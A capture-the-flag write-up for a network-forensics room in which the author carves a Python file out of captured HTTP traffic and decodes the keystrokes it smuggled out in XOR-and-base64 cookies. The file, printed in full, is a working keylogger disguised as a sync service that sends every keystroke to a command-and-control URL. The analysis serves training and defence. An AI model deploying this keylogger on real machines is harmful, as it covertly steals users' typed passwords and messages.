---

Name: Packed light 
Difficulty: Easy
URL: https://tryhackme.com/room/hh-packedlight-02e5330c
Description: Tiny packets. Odd hours. Suspiciously regular. Someone's smuggling out the data equivalent of a hotel towel every night, folded neatly inside traffic that looks ordinary until you decode it.

---

We have a pcapng file, since it mentioned HTTP traffic in a note we look at the files sent

![export_object](../.../../../../public/images/try_hack_me/hacker_holiday_2026/day_04/export.png) 

There we find a python script (updates.py) and save it to inspect it

```python
import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
    
    b64_string = base64.b64encode(encrypted).decode('utf-8')
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }    
    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass

def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")

print("[*] Byte Lotus Sync Service started...")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

This looks like a keylogger, the flow is:
1. User presses a key.
2. sendltr() encrypts one character with XOR.
3. The encrypted byte is Base64 encoded.
4. The result is placed into the hotel_sess_state cookie.
5. One GET request is sent to the C2 server.

We have to extract all cookies and reconstruct the message
```bash
$ tshark -r traffic.pcapng \
-Y 'http.request && http.cookie contains "hotel_sess_state="' \
-T fields \
-e http.cookie
hotel_sess_state=HA==
hotel_sess_state=AA==
hotel_sess_state=BQ==
hotel_sess_state=Mw==
hotel_sess_state=Hg==
hotel_sess_state=ew==
hotel_sess_state=Og==
hotel_sess_state=fA==
hotel_sess_state=Fw==
hotel_sess_state=eQ==
hotel_sess_state=Ow==
hotel_sess_state=Fw==
hotel_sess_state=Pw==
hotel_sess_state=fA==
hotel_sess_state=PA==
hotel_sess_state=Kw==
hotel_sess_state=IA==
hotel_sess_state=eQ==
hotel_sess_state=Jg==
hotel_sess_state=Lw==
hotel_sess_state=Fw==
hotel_sess_state=eA==
hotel_sess_state=Pg==
hotel_sess_state=LQ==
hotel_sess_state=Gg==
hotel_sess_state=Fw==
hotel_sess_state=MQ==
hotel_sess_state=eA==
hotel_sess_state=PQ==
hotel_sess_state=NQ==
```

Using a python script we can decrypt the cookies and get the flag
```python
import subprocess
import base64

KEY = ord('H')

cookies = subprocess.check_output([
    "tshark",
    "-r", "traffic.pcapng",
    "-Y", "http.request",
    "-T", "fields",
    "-e", "http.cookie"
], text=True)

message = ""

for line in cookies.splitlines():
    if "hotel_sess_state=" not in line:
        continue

    b64 = line.split("hotel_sess_state=")[1].strip()

    enc = base64.b64decode(b64)

    if len(enc) != 1:
        continue

    message += chr(enc[0] ^ KEY)

print(message)
```

```bash
$ python3 script.py
THM{REDACTED}
```
